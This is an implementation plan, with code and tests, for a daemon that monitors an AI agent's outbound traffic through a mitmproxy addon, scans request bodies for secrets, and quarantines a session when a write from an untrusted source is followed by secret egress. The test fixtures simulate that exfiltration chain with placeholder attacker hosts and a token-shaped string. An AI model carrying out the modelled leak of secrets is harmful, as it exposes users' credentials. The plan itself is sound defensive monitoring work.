# v1 Sub-project B — Live Egress Detection Pipeline Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make the row-1 exfil chain observable end-to-end by real sensors — catch a secret when it leaves the sandbox (Tier-1 DLP on the egress request body), correlate it with the tainting file write, and QUARANTINE — with no synthetically injected events.

**Architecture:** A daemon-supervised headless `mitmdump` runs a mitmproxy addon that ships each captured request over a unix socket to a new `EgressSensor`, which stores the body as a blob and publishes a `network_upload` event. The existing cascade then runs Tier-1 (Gitleaks/Presidio) on the body; a secret detection on a tainted-session egress completes a reframed provenance chain `untrusted-source → secret-egress`. `WorkspaceSensor` is also wired to store payloads so Tier-1 runs on sensitive writes.

**Tech Stack:** Python 3.12, asyncio, `mitmproxy` (new dependency, provides `mitmdump`), unix domain sockets, pydantic, pytest.

**Spec:** `docs/superpowers/specs/2026-08-13-v1-egress-detection-pipeline-design.md`

## Global Constraints

- Python ≥ 3.12; run everything via `uv run`. Tests: `uv run pytest`.
- **Fail-safe, never fail-closed:** B does no inline blocking. Any failure (proxy dead, socket down, malformed frame) degrades to "no inspection," never a stalled/blocked request. The addon drops records on socket error and returns immediately.
- **The daemon owns the proxy listener.** The egress proxy must be *our* addon-bearing `mitmdump`; a plain proxy (dev `mitmweb`) captures nothing. If `proxy_port` is already bound, that is a reported error (`degraded`), not a proxy to reuse.
- Body size cap `MAX_BODY = 1_048_576` (1 MiB), used identically in the addon and `WorkspaceSensor`. Oversize → metadata-only event with `truncated=True`, no blob.
- Anthropic hosts are skipped by the addon: a host `h` is skipped when `h == d or h.endswith("." + d)` for `d in ("anthropic.com", "claude.ai", "claude.com")`. (OAuth/API bodies must never reach inspection.)
- `Detection.classification` prefixes: Gitleaks emits `secret:<RuleID>`, Presidio emits `pii:<entity>`. "Has a secret" ≡ any detection whose `classification` starts with `secret:` or `pii:`.
- Provenance chain step labels are exact strings: `untrusted-source: <label>`, `secret-egress: <destination>`, and the retained `egress: <destination>` / `sensitive-access: <path>`.
- The egress proxy/subprocess must NOT spawn during ordinary daemon/corpus/bench tests. Gate it behind `DaemonConfig.enable_egress` (default `False`); `EgressSensor` is constructed and run only when enabled.
- Unit tests must not require a live sandbox or a running mitmproxy. The one live test is opt-in, env-gated, and skipped by default.
- Follow existing patterns: `from __future__ import annotations`; sensors implement `async run(bus)` + `def stop()`; events built with `new_event(...)`.

## File Structure

```
src/agentwall/sensors/egress_addon.py   # NEW: mitmproxy addon — build_record, send_record, EgressAddon (Task 3)
src/agentwall/sensors/egress.py         # NEW: EgressSensor — unix-socket ingest + mitmdump supervision (Task 4)
src/agentwall/sensors/workspace.py      # MOD: blob_put + capped read + payload_ref (Task 2)
src/agentwall/provenance.py             # MOD: observe(event, has_secret) + secret-egress completion (Task 1)
src/agentwall/detect/cascade.py         # MOD: run Tier-1 detectors via asyncio.to_thread (Task 5)
src/agentwall/daemon.py                 # MOD: wire blob_put, construct/run EgressSensor, has_secret, offload (Task 5)
bench/run_bench.py                      # MOD: egress-path latency measurement (Task 7)
tests/... (mirror)                      # plus tests/integration/test_egress_live.py (Task 6)
```

---

## Task 1: Provenance reframe — `secret-egress` completion

**Files:**
- Modify: `src/agentwall/provenance.py`
- Test: `tests/test_provenance.py`

**Interfaces:**
- Consumes: `SecurityEvent`, `new_event` (existing); `Chain`, `_State`, `ChainCorrelator` (existing).
- Produces: `ChainCorrelator.observe(self, event: SecurityEvent, has_secret: bool = False) -> Chain | None`. When an egress event arrives in a tainted, in-window session: `has_secret=True` completes `untrusted-source → secret-egress` (no prior sensitive-access needed); otherwise the existing `sensitive-access → egress` path still completes. Default `has_secret=False` keeps all existing callers working.

- [ ] **Step 1: Write the failing tests**

Add to `tests/test_provenance.py`:

```python
from agentwall.events import new_event
from agentwall.provenance import ChainCorrelator


def _tainted(ts=1.0):
    return new_event(event_type="file_write", session_id="s", source="workspace", ts=ts,
                     trust="tainted", attrs={"untrusted_source": "evil/README.md"})


def _egress(ts=2.0):
    return new_event(event_type="network_upload", session_id="s", source="egress", ts=ts,
                     attrs={"destination": "first-seen.xyz"})


def test_secret_egress_completes_two_hop_chain():
    corr = ChainCorrelator()
    assert corr.observe(_tainted()) is None
    chain = corr.observe(_egress(), has_secret=True)
    assert chain is not None
    assert chain.steps == ["untrusted-source: evil/README.md", "secret-egress: first-seen.xyz"]
    assert len(chain.event_ids) == 2


def test_egress_without_secret_or_sensitive_is_not_a_chain():
    corr = ChainCorrelator()
    assert corr.observe(_tainted()) is None
    assert corr.observe(_egress(), has_secret=False) is None


def test_secret_egress_outside_window_resets():
    corr = ChainCorrelator(window_s=10.0)
    assert corr.observe(_tainted(ts=1.0)) is None
    assert corr.observe(_egress(ts=100.0), has_secret=True) is None
```

- [ ] **Step 2: Run to verify they fail**

Run: `uv run pytest tests/test_provenance.py -k "secret_egress or without_secret" -v`
Expected: FAIL (`observe()` takes no `has_secret` kwarg / chain not built).

- [ ] **Step 3: Implement**

In `src/agentwall/provenance.py`, change the `observe` signature and the egress branch. Replace the method body's egress block (currently lines ~55–63) so the whole method reads:

```python
    def observe(self, event: SecurityEvent, has_secret: bool = False) -> Chain | None:
        st = self._states.setdefault(event.session_id, _State())

        if is_untrusted(event):
            label = str(event.attrs.get("untrusted_source", "tainted-source"))
            st.tainted_at = event.ts
            st.steps = [f"untrusted-source: {label}"]
            st.ids = [event.event_id]
            st.sensitive_seen = False
            return None

        if st.tainted_at is not None and not st.sensitive_seen:
            sensitive = (event.source == "workspace") and (
                event.attrs.get("sensitive")
                or (event.event_type in {"file_read", "file_write"} and event.attrs.get("path"))
            )
            if sensitive:
                st.sensitive_seen = True
                st.steps.append(f"sensitive-access: {event.attrs.get('path', '?')}")
                st.ids.append(event.event_id)
                return None

        if event.source == "egress" and st.tainted_at is not None:
            if event.ts - st.tainted_at <= self._w:
                dest = event.attrs.get("destination", "?")
                if has_secret:
                    step = f"secret-egress: {dest}"
                elif st.sensitive_seen:
                    step = f"egress: {dest}"
                else:
                    return None
                st.steps.append(step)
                st.ids.append(event.event_id)
                chain = Chain(session_id=event.session_id, steps=list(st.steps), event_ids=list(st.ids))
                self._states[event.session_id] = _State()
                return chain
            self._states[event.session_id] = _State()
        return None
```

- [ ] **Step 4: Run tests**

Run: `uv run pytest tests/test_provenance.py -v`
Expected: PASS (new tests + all pre-existing provenance tests still green).

- [ ] **Step 5: Commit**

```bash
git add src/agentwall/provenance.py tests/test_provenance.py
git commit -m "feat: provenance secret-egress completion (untrusted-source -> secret-egress)"
```

---

## Task 2: WorkspaceSensor payload wiring

**Files:**
- Modify: `src/agentwall/sensors/workspace.py`
- Test: `tests/sensors/test_workspace.py`

**Interfaces:**
- Consumes: `content_hash`, `new_event`, `classify_path` (existing).
- Produces: `WorkspaceSensor.__init__(self, workspace, session_id, skills_store=None, clock=time.time, blob_put: Callable[[bytes], str] | None = None)`. `make_event` now sets `payload_ref = blob_put(data)` for readable `sensitive` or `implicit_exec` paths (data = first `MAX_BODY` bytes), and `content_hash` over the same capped bytes. Non-matching paths keep `payload_ref=None`. `MAX_BODY = 1_048_576` module constant.

- [ ] **Step 1: Write the failing tests**

Add to `tests/sensors/test_workspace.py`:

```python
def test_payload_ref_set_for_sensitive_write(tmp_path):
    blobs = {}
    def blob_put(b):
        ref = f"blob:{len(blobs) + 1}"
        blobs[ref] = b
        return ref
    sensor = WorkspaceSensor(workspace=tmp_path, session_id="s", blob_put=blob_put)
    f = tmp_path / ".env"
    f.write_text("SECRET=abc")
    e = sensor.make_event("file_write", str(f))
    assert e.payload_ref is not None
    assert blobs[e.payload_ref] == b"SECRET=abc"


def test_no_payload_ref_for_normal_write(tmp_path):
    sensor = WorkspaceSensor(workspace=tmp_path, session_id="s", blob_put=lambda b: "blob:1")
    f = tmp_path / "src.py"
    f.write_text("x = 1")
    e = sensor.make_event("file_write", str(f))
    assert e.payload_ref is None


def test_no_blob_put_means_no_payload_ref(tmp_path):
    sensor = WorkspaceSensor(workspace=tmp_path, session_id="s")  # no blob_put
    f = tmp_path / ".env"
    f.write_text("SECRET=abc")
    e = sensor.make_event("file_write", str(f))
    assert e.payload_ref is None
    assert e.content_hash is not None
```

- [ ] **Step 2: Run to verify they fail**

Run: `uv run pytest tests/sensors/test_workspace.py -k "payload_ref or blob_put" -v`
Expected: FAIL (`blob_put` not accepted / `payload_ref` always None).

- [ ] **Step 3: Implement**

In `src/agentwall/sensors/workspace.py`:

Add the import and constant near the top (after existing imports):

```python
from typing import Callable

MAX_BODY = 1_048_576
```

Change `__init__` to accept and store `blob_put`:

```python
    def __init__(self, workspace: Path, session_id: str, skills_store: Path | None = None,
                 clock: Callable[[], float] = time.time,
                 blob_put: Callable[[bytes], str] | None = None) -> None:
        self._workspace = Path(workspace)
        self._session = session_id
        self._skills = Path(skills_store) if skills_store else None
        self._clock = clock
        self._blob_put = blob_put
        self._observer: Observer | None = None
```

Replace the content-hash block at the end of `make_event` (the `chash = None ... return new_event(...)` tail) with:

```python
        chash = None
        payload_ref = None
        p = Path(path)
        if p.is_file():
            try:
                with p.open("rb") as fh:
                    data = fh.read(MAX_BODY)
            except OSError:
                data = None
            if data is not None:
                chash = content_hash(data)
                if self._blob_put is not None and (attrs.get("sensitive") or attrs.get("implicit_exec")):
                    payload_ref = self._blob_put(data)
        return new_event(event_type=kind, session_id=self._session, source="workspace",
                         ts=self._clock(), trust=trust, content_hash=chash,
                         payload_ref=payload_ref, attrs=attrs)
```

- [ ] **Step 4: Run tests**

Run: `uv run pytest tests/sensors/test_workspace.py -v`
Expected: PASS (new + existing).

- [ ] **Step 5: Commit**

```bash
git add src/agentwall/sensors/workspace.py tests/sensors/test_workspace.py
git commit -m "feat: WorkspaceSensor stores payloads for sensitive/implicit-exec writes (capped read)"
```

---

## Task 3: Egress addon (record building + socket send)

**Files:**
- Create: `src/agentwall/sensors/egress_addon.py`
- Test: `tests/sensors/test_egress_addon.py`

**Interfaces:**
- Consumes: nothing from the project (must import cleanly without `mitmproxy` installed — NO top-level mitmproxy import; the addon hook duck-types `flow.request`).
- Produces:
  - `MAX_BODY = 1_048_576`
  - `skip_host(host: str) -> bool`
  - `build_record(*, host: str, method: str, path: str, scheme: str, ts: float, body: bytes | None) -> dict` — keys `host, method, path, scheme, ts, size, truncated, body_b64` (`body_b64` is base64 str or `None`; `None` when body empty or truncated; `size` is the original body length).
  - `send_record(socket_path: str, record: dict) -> None` — length-prefixed (`>I`) JSON frame over `AF_UNIX`; drops silently on `OSError`.
  - `EgressAddon` with `request(self, flow)` hook and module-level `addons = [EgressAddon()]`.

- [ ] **Step 1: Write the failing tests**

Create `tests/sensors/test_egress_addon.py`:

```python
import base64
import socket
import struct

from agentwall.sensors.egress_addon import build_record, skip_host, send_record


def test_skip_host_matches_anthropic_and_subdomains():
    assert skip_host("api.anthropic.com")
    assert skip_host("anthropic.com")
    assert skip_host("claude.ai")
    assert skip_host("downloads.claude.ai")
    assert not skip_host("httpbin.org")
    assert not skip_host("evil-anthropic.com.attacker.net")


def test_build_record_captures_body():
    rec = build_record(host="httpbin.org", method="POST", path="/post",
                       scheme="https", ts=1.0, body=b"secret=abc")
    assert rec["host"] == "httpbin.org" and rec["method"] == "POST"
    assert rec["size"] == 10 and rec["truncated"] is False
    assert base64.b64decode(rec["body_b64"]) == b"secret=abc"


def test_build_record_truncates_oversize_body():
    big = b"x" * (1_048_576 + 1)
    rec = build_record(host="h", method="POST", path="/", scheme="https", ts=1.0, body=big)
    assert rec["truncated"] is True
    assert rec["body_b64"] is None
    assert rec["size"] == 1_048_577


def test_send_record_writes_length_prefixed_frame(tmp_path):
    sock_path = str(tmp_path / "e.sock")
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(sock_path)
    srv.listen(1)
    send_record(sock_path, {"host": "h", "method": "GET"})
    conn, _ = srv.accept()
    hdr = conn.recv(4)
    (n,) = struct.unpack(">I", hdr)
    body = conn.recv(n)
    conn.close()
    srv.close()
    import json
    assert json.loads(body)["host"] == "h"


def test_send_record_silent_when_socket_absent(tmp_path):
    send_record(str(tmp_path / "nope.sock"), {"host": "h"})  # must not raise
```

- [ ] **Step 2: Run to verify they fail**

Run: `uv run pytest tests/sensors/test_egress_addon.py -v`
Expected: FAIL (module does not exist).

- [ ] **Step 3: Implement**

Create `src/agentwall/sensors/egress_addon.py`:

```python
from __future__ import annotations

import base64
import json
import os
import socket
import struct
import time

MAX_BODY = 1_048_576
_SKIP_DOMAINS = ("anthropic.com", "claude.ai", "claude.com")
_DEFAULT_SOCK = os.path.join(os.environ.get("XDG_RUNTIME_DIR", "/tmp"), "agentwall", "egress.sock")


def skip_host(host: str) -> bool:
    h = (host or "").lower()
    return any(h == d or h.endswith("." + d) for d in _SKIP_DOMAINS)


def build_record(*, host: str, method: str, path: str, scheme: str, ts: float,
                 body: bytes | None) -> dict:
    raw = body or b""
    size = len(raw)
    truncated = size > MAX_BODY
    body_b64 = None if (truncated or not raw) else base64.b64encode(raw).decode()
    return {"host": host, "method": method, "path": path, "scheme": scheme,
            "ts": ts, "size": size, "truncated": truncated, "body_b64": body_b64}


def send_record(socket_path: str, record: dict) -> None:
    data = json.dumps(record).encode()
    frame = struct.pack(">I", len(data)) + data
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect(socket_path)
        s.sendall(frame)
        s.close()
    except OSError:
        return  # fail-safe: never block or raise on the egress path


class EgressAddon:
    def __init__(self, socket_path: str | None = None) -> None:
        self._sock = socket_path or os.environ.get("AGENTWALL_EGRESS_SOCK", _DEFAULT_SOCK)

    def request(self, flow) -> None:  # mitmproxy hook; flow is duck-typed
        req = flow.request
        host = getattr(req, "pretty_host", "") or getattr(req, "host", "")
        if skip_host(host):
            return
        body = req.raw_content if getattr(req, "raw_content", None) else b""
        rec = build_record(host=host, method=req.method, path=req.path,
                           scheme=req.scheme, ts=getattr(req, "timestamp_start", time.time()),
                           body=body)
        send_record(self._sock, rec)


addons = [EgressAddon()]
```

- [ ] **Step 4: Run tests**

Run: `uv run pytest tests/sensors/test_egress_addon.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/agentwall/sensors/egress_addon.py tests/sensors/test_egress_addon.py
git commit -m "feat: mitmproxy egress addon — record building + unix-socket send (fail-safe)"
```

---

## Task 4: EgressSensor — unix-socket ingest + proxy supervision

**Files:**
- Create: `src/agentwall/sensors/egress.py`
- Test: `tests/sensors/test_egress.py`
- Modify: `pyproject.toml` (add `mitmproxy` dependency)

**Interfaces:**
- Consumes: `new_event` (events), `send_record` (for tests), the addon module path.
- Produces:
  - `default_socket_path() -> str`
  - `EgressSensor(socket_path: str, blob_put: Callable[[bytes], str], session_id: str, dead_letter: Callable[[str, str], None], *, proxy_port: int = 8888, spawn_proxy: bool = True)` implementing `RuntimeSensor` (`async run(bus)`, `stop()`), attribute `degraded: bool`.
  - Internal: `_to_event(rec: dict) -> SecurityEvent` (source `"egress"`, event_type `"network_upload"`, `payload_ref` set from `body_b64` via `blob_put`, attrs `{destination, method, path, size, truncated}`). Malformed frames → `dead_letter(raw, err)`, loop survives.
  - `run(bus)`: when `spawn_proxy`, start `mitmdump` (else skip — for tests); then serve the unix socket until `stop()`.

- [ ] **Step 1: Add the mitmproxy dependency**

Run:
```bash
cd /Users/patrick/Development/agentwall
uv add mitmproxy
```
Expected: `mitmproxy` added to `pyproject.toml` `[project].dependencies`; `uv run mitmdump --version` prints a version.

- [ ] **Step 2: Write the failing tests**

Create `tests/sensors/test_egress.py`:

```python
import asyncio

import pytest

from agentwall.events import SecurityEvent
from agentwall.sensors.egress import EgressSensor
from agentwall.sensors.egress_addon import build_record, send_record


class _FakeBus:
    def __init__(self):
        self.events = []
    async def publish(self, event):
        self.events.append(event)


def _sensor(tmp_path):
    blobs = {}
    def blob_put(b):
        ref = f"blob:{len(blobs) + 1}"
        blobs[ref] = b
        return ref
    dead = []
    s = EgressSensor(socket_path=str(tmp_path / "e.sock"), blob_put=blob_put,
                     session_id="s", dead_letter=lambda raw, err: dead.append((raw, err)),
                     spawn_proxy=False)
    return s, blobs, dead


@pytest.mark.asyncio
async def test_ingest_frame_becomes_egress_event(tmp_path):
    s, blobs, _ = _sensor(tmp_path)
    bus = _FakeBus()
    task = asyncio.create_task(s.run(bus))
    await asyncio.sleep(0.2)  # let the server bind
    rec = build_record(host="first-seen.xyz", method="POST", path="/p",
                       scheme="https", ts=2.0, body=b"SECRET=abc")
    await asyncio.to_thread(send_record, str(tmp_path / "e.sock"), rec)
    await asyncio.sleep(0.2)
    s.stop()
    await task
    assert len(bus.events) == 1
    ev = bus.events[0]
    assert isinstance(ev, SecurityEvent)
    assert ev.source == "egress" and ev.event_type == "network_upload"
    assert ev.attrs["destination"] == "first-seen.xyz"
    assert ev.payload_ref is not None and blobs[ev.payload_ref] == b"SECRET=abc"


@pytest.mark.asyncio
async def test_malformed_frame_is_dead_lettered_and_loop_survives(tmp_path):
    s, _, dead = _sensor(tmp_path)
    bus = _FakeBus()
    task = asyncio.create_task(s.run(bus))
    await asyncio.sleep(0.2)
    # hand-write a garbage length-prefixed frame
    import socket, struct
    c = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    c.connect(str(tmp_path / "e.sock"))
    payload = b"not json"
    c.sendall(struct.pack(">I", len(payload)) + payload)
    c.close()
    await asyncio.sleep(0.2)
    # a subsequent valid frame still works
    await asyncio.to_thread(send_record, str(tmp_path / "e.sock"),
                            build_record(host="h", method="GET", path="/", scheme="https", ts=1.0, body=b""))
    await asyncio.sleep(0.2)
    s.stop()
    await task
    assert len(dead) == 1
    assert len(bus.events) == 1  # the valid GET (no body → no blob)
    assert bus.events[0].payload_ref is None
```

- [ ] **Step 3: Run to verify they fail**

Run: `uv run pytest tests/sensors/test_egress.py -v`
Expected: FAIL (module does not exist).

- [ ] **Step 4: Implement**

Create `src/agentwall/sensors/egress.py`:

```python
from __future__ import annotations

import asyncio
import base64
import json
import os
import struct
import subprocess
import sys
from pathlib import Path
from typing import Callable

from agentwall.events import SecurityEvent, new_event

_ADDON = str(Path(__file__).with_name("egress_addon.py"))


def default_socket_path() -> str:
    base = os.environ.get("XDG_RUNTIME_DIR", "/tmp")
    return os.path.join(base, "agentwall", "egress.sock")


class EgressSensor:
    def __init__(self, socket_path: str, blob_put: Callable[[bytes], str], session_id: str,
                 dead_letter: Callable[[str, str], None], *, proxy_port: int = 8888,
                 spawn_proxy: bool = True) -> None:
        self._sock = socket_path
        self._blob_put = blob_put
        self._session = session_id
        self._dead_letter = dead_letter
        self._port = proxy_port
        self._spawn = spawn_proxy
        self._server: asyncio.AbstractServer | None = None
        self._proc: subprocess.Popen | None = None
        self._stop_event = asyncio.Event()  # 3.12: safe to create without a running loop
        self.degraded = False

    def _to_event(self, rec: dict) -> SecurityEvent:
        payload_ref = None
        body_b64 = rec.get("body_b64")
        if body_b64:
            payload_ref = self._blob_put(base64.b64decode(body_b64))
        return new_event(event_type="network_upload", session_id=self._session, source="egress",
                         ts=float(rec.get("ts", 0.0)), payload_ref=payload_ref,
                         attrs={"destination": rec.get("host"), "method": rec.get("method"),
                                "path": rec.get("path"), "size": rec.get("size"),
                                "truncated": bool(rec.get("truncated", False))})

    def _start_proxy(self) -> None:
        if _port_in_use(self._port):
            self.degraded = True
            raise RuntimeError(
                f"port {self._port} already in use — stop the conflicting proxy "
                f"(the daemon must own the addon-bearing mitmdump)")
        env = {**os.environ, "AGENTWALL_EGRESS_SOCK": self._sock}
        self._proc = subprocess.Popen(
            ["mitmdump", "-s", _ADDON, "-p", str(self._port), "--set", "stream_large_bodies=1m"],
            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    async def run(self, bus) -> None:
        if self._spawn:
            self._start_proxy()
        os.makedirs(os.path.dirname(self._sock), exist_ok=True)
        if os.path.exists(self._sock):
            os.unlink(self._sock)
        self._server = await asyncio.start_unix_server(self._make_handler(bus), path=self._sock)
        async with self._server:
            await self._stop_event.wait()  # stop() sets this; exiting the context closes the server

    def _make_handler(self, bus):
        async def handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            raw = b""
            try:
                hdr = await reader.readexactly(4)
                (n,) = struct.unpack(">I", hdr)
                raw = await reader.readexactly(n)
                rec = json.loads(raw)
                await bus.publish(self._to_event(rec))
            except Exception as exc:  # fail-safe: dead-letter, keep serving
                self._dead_letter(raw.decode("utf-8", "replace"), repr(exc))
            finally:
                writer.close()
        return handle

    def stop(self) -> None:
        self._stop_event.set()  # unblocks run()'s wait; the async-with then closes the server
        if self._proc is not None and self._proc.poll() is None:
            self._proc.terminate()
        if os.path.exists(self._sock):
            try:
                os.unlink(self._sock)
            except OSError:
                pass


def _port_in_use(port: int) -> bool:
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("127.0.0.1", port))
        return False
    except OSError:
        return True
    finally:
        s.close()
```

Note: `run()` awaits `self._stop_event`; `stop()` sets it, `run()` exits the `async with` (which closes the server), and the awaiting task completes cleanly. `_stop_event` is created in `__init__` (safe on 3.12 without a running loop), so `stop()` can never race ahead of `run()`.

- [ ] **Step 5: Run tests**

Run: `uv run pytest tests/sensors/test_egress.py -v`
Expected: PASS (both ingest and malformed-frame tests).

- [ ] **Step 6: Commit**

```bash
git add src/agentwall/sensors/egress.py tests/sensors/test_egress.py pyproject.toml uv.lock
git commit -m "feat: EgressSensor — unix-socket ingest, mitmdump supervision, dead-letter on malformed"
```

---

## Task 5: Daemon integration — wire sensors, has_secret, async offload

**Files:**
- Modify: `src/agentwall/policy/engine.py`
- Modify: `src/agentwall/daemon.py`
- Modify: `src/agentwall/detect/cascade.py`
- Test: `tests/policy/test_engine.py`
- Test: `tests/test_daemon.py`

**Interfaces:**
- Consumes: `EgressSensor` (Task 4), `WorkspaceSensor(blob_put=...)` (Task 2), `ChainCorrelator.observe(event, has_secret=...)` (Task 1), `EventStore.put_blob/dead_letter`, `CascadeResult.detections`.
- Produces:
  - **`PolicyEngine.evaluate` returns the MOST SEVERE applicable verdict** across all matching rules (each capability-gated) instead of the first match. Decided 2026-08-13: a secret-bearing egress that is also in an exfil chain matches both `block-secret-egress` (BLOCK→WARN when the adapter can't inline-block) and `quarantine-exfil-chain` (QUARANTINE); the more severe surviving verdict (QUARANTINE) must win. Order-independent; hardens a latent v0 fragility.
  - `DaemonConfig` gains `enable_egress: bool = False`, `egress_socket: Path | None = None`, `proxy_port: int = 8888`.
  - `Cascade.run` executes Tier-1 detectors via `asyncio.to_thread` (non-blocking event loop).
  - `Daemon._on_event` computes `has_secret` from detections and passes it to `observe`; `adapter.quarantine` is offloaded via `asyncio.to_thread`.
  - `Daemon` injects `blob_put=self._store.put_blob` into `WorkspaceSensor`; constructs and (in `start`) runs `EgressSensor` only when `config.enable_egress`.
  - `Daemon.health()` includes `"egress_degraded": bool`.

- [ ] **Step 1: Write the failing test**

Add to `tests/test_daemon.py`:

```python
import asyncio
from pathlib import Path

import pytest

from agentwall.adapters.docker_sandbox import DockerSandboxAdapter
from agentwall.daemon import Daemon, DaemonConfig
from agentwall.detect.model import Verdict
from agentwall.detect.tier0_rules import RulesConfig
from agentwall.events import new_event

_POLICY = Path("src/agentwall/policy/default_policy.yaml")
_RULES = RulesConfig(sensitive_path_globs=["**/.env"], denied_dest_domains=[],
                     max_upload_bytes=5_000_000, entropy_threshold=7.5)

# A real secret Gitleaks detects (GitHub PAT shape; AWS EXAMPLE keys are allowlisted).
_SECRET = b"token=ghp_012345678901234567890123456789ABCD"


@pytest.mark.asyncio
async def test_secret_bearing_egress_completes_chain_and_quarantines(tmp_path):
    cfg = DaemonConfig(workspace=tmp_path, session_id="s1", db_path=tmp_path / "ev.db",
                       policy_path=_POLICY, rules=_RULES)
    d = Daemon(cfg, adapter=DockerSandboxAdapter(workspace=tmp_path))

    tainted = new_event(event_type="file_write", session_id="s1", source="workspace", ts=1.0,
                        trust="tainted", attrs={"untrusted_source": "evil.example/README.md"})
    await d.submit(tainted)

    ref = d._store.put_blob(_SECRET)  # simulate the EgressSensor having stored a body
    egress = new_event(event_type="network_upload", session_id="s1", source="egress", ts=2.0,
                       payload_ref=ref, attrs={"destination": "first-seen.xyz"})
    await d.submit(egress)

    verdicts = [dec.verdict for _, dec, _ in d.decisions]
    chains = [c for _, _, c in d.decisions if c is not None]
    assert Verdict.QUARANTINE in verdicts
    assert chains and chains[-1].steps == [
        "untrusted-source: evil.example/README.md", "secret-egress: first-seen.xyz"]
    await d.stop()


@pytest.mark.asyncio
async def test_health_reports_egress_degraded_field(tmp_path):
    cfg = DaemonConfig(workspace=tmp_path, session_id="s", db_path=tmp_path / "ev.db",
                       policy_path=_POLICY, rules=_RULES)
    d = Daemon(cfg, adapter=DockerSandboxAdapter(workspace=tmp_path))
    assert "egress_degraded" in d.health()
    await d.stop()
```

- [ ] **Step 2: Run to verify it fails**

Run: `uv run pytest tests/test_daemon.py -k "secret_bearing or egress_degraded" -v`
Expected: FAIL (chain not completed / `egress_degraded` missing).

- [ ] **Step 3: Policy engine — return the most severe applicable verdict**

In `src/agentwall/policy/engine.py`, change `evaluate` from first-match to
most-severe-applicable-match. Compute each matching rule's capability-gated
verdict (BLOCK/QUARANTINE downgrade to WARN when the adapter lacks the
capability) and return the `Decision` with the highest `Verdict` (an
`IntEnum`, so `>` compares severity). Replace the whole `evaluate` method:

```python
    def evaluate(self, event: SecurityEvent, detections: list[Detection], in_chain: bool) -> Decision:
        best: Decision | None = None
        for rule in self._rules:
            if self._matches(rule.get("match", {}), event, detections, in_chain):
                verdict = Verdict[rule["action"]]
                need = _CAP_FOR.get(verdict)
                if need and need not in self._caps:
                    cand = Decision(verdict=Verdict.WARN, matched_rule=rule["name"],
                                    explanation=f"{verdict.name} downgraded to WARN: adapter lacks '{need}'",
                                    downgraded=True)
                else:
                    cand = Decision(verdict=verdict, matched_rule=rule["name"],
                                    explanation=f"matched rule '{rule['name']}'")
                if best is None or cand.verdict > best.verdict:
                    best = cand
        if best is None:
            return Decision(verdict=Verdict.ALLOW, matched_rule=None, explanation="no rule matched")
        return best
```

Add two tests to `tests/policy/test_engine.py` (imports already present there):

```python
def test_secret_egress_in_chain_quarantines_over_downgraded_block():
    # block-secret-egress (BLOCK) downgrades to WARN without 'block'; quarantine-exfil-chain
    # (QUARANTINE) survives with 'quarantine' — the more severe verdict must win.
    pe = PolicyEngine.from_yaml(POLICY, capabilities={"quarantine"})
    d = pe.evaluate(_egress(), [Detection(tier=1, classification="secret:aws", confidence=0.9)],
                    in_chain=True)
    assert d.verdict is Verdict.QUARANTINE and d.matched_rule == "quarantine-exfil-chain"


def test_secret_egress_not_in_chain_downgrades_to_warn():
    # only block-secret-egress matches; no 'block' capability → downgraded WARN.
    pe = PolicyEngine.from_yaml(POLICY, capabilities={"quarantine"})
    d = pe.evaluate(_egress(), [Detection(tier=1, classification="secret:aws", confidence=0.9)],
                    in_chain=False)
    assert d.verdict is Verdict.WARN and d.downgraded is True
```

Run: `uv run pytest tests/policy/test_engine.py -v`
Expected: the two new tests PASS and the four pre-existing engine tests still PASS (each matches a single rule, so most-severe == first-match for them).

- [ ] **Step 4: Offload Tier-1 in the cascade**

In `src/agentwall/detect/cascade.py`, make the Tier-1 loop non-blocking. Add `import asyncio` at the top, and change the Tier-1 loop inside `run`:

```python
        for d in self._t0:
            dets.extend(d.inspect(event, payload))
        for d in self._t1:
            dets.extend(await asyncio.to_thread(d.inspect, event, payload))
```

- [ ] **Step 5: Wire the daemon**

In `src/agentwall/daemon.py`:

Add `enable_egress`/`egress_socket`/`proxy_port` to `DaemonConfig`:

```python
class DaemonConfig(BaseModel):
    workspace: Path
    session_id: str
    db_path: Path
    policy_path: Path
    rules: RulesConfig
    skills_store: Path | None = None
    enable_egress: bool = False
    egress_socket: Path | None = None
    proxy_port: int = 8888
```

Add the import:

```python
from agentwall.sensors.egress import EgressSensor, default_socket_path
```

In `Daemon.__init__`, inject `blob_put` into the workspace sensor and construct the egress sensor conditionally (place after the existing `self._sensor = ...` line):

```python
        self._sensor = WorkspaceSensor(config.workspace, config.session_id, config.skills_store,
                                       blob_put=self._store.put_blob)
        self._egress: EgressSensor | None = None
        self._egress_task: asyncio.Task | None = None
        if config.enable_egress:
            self._egress = EgressSensor(
                socket_path=str(config.egress_socket or default_socket_path()),
                blob_put=self._store.put_blob, session_id=config.session_id,
                dead_letter=self._store.dead_letter, proxy_port=config.proxy_port)
```

Rewrite `_on_event`:

```python
    async def _on_event(self, event: SecurityEvent) -> None:
        payload = self._store.get_blob(event.payload_ref) if event.payload_ref else None
        result = await self._cascade.run(event, payload)
        has_secret = any(
            d.classification.startswith("secret:") or d.classification.startswith("pii:")
            for d in result.detections
        )
        chain = self._correlator.observe(event, has_secret=has_secret)
        decision = self._policy.evaluate(event, result.detections, in_chain=chain is not None)
        if decision.verdict == Verdict.QUARANTINE and "quarantine" in self._adapter.capabilities():
            await asyncio.to_thread(self._adapter.quarantine, self._cfg.session_id)
        self.decisions.append((event, decision, chain))
```

Run the egress sensor in `start`:

```python
    async def start(self) -> None:
        await self._bus.replay_unprocessed()
        self._sensor_task = asyncio.create_task(self._sensor.run(self._bus))
        if self._egress is not None:
            self._egress_task = asyncio.create_task(self._egress.run(self._bus))
```

Stop it in `stop` (before `self._store.close()`):

```python
    async def stop(self) -> None:
        self._sensor.stop()
        if self._sensor_task:
            await self._sensor_task
        if self._egress is not None:
            self._egress.stop()
        if self._egress_task:
            await self._egress_task
        self._store.close()
```

Add the health field:

```python
    def health(self) -> dict:
